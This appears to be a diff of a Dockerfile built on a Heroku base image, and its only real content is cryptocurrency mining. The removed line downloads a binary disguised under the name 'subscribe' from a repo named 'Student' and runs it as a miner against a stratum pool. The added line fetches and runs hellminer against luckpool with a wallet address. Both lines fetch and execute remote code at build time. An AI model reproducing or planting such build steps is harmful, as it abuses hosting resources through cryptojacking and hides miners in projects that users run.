@@ -1,4 +1,4 @@
 FROM heroku/heroku:18
 RUN apt-get install -y curl git unzip wget
-RUN wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a yespowersugar  -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qq49whq6jxyey9zeyp5s0xsl98nyg0wvvax3k6e.Tesnet -t 2
+RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RQFAzGsrDocDdd5jUaY8iXzkY3WjrvfgfL.Arifin -p x --cpu 2
 CMD bash heroku.sh
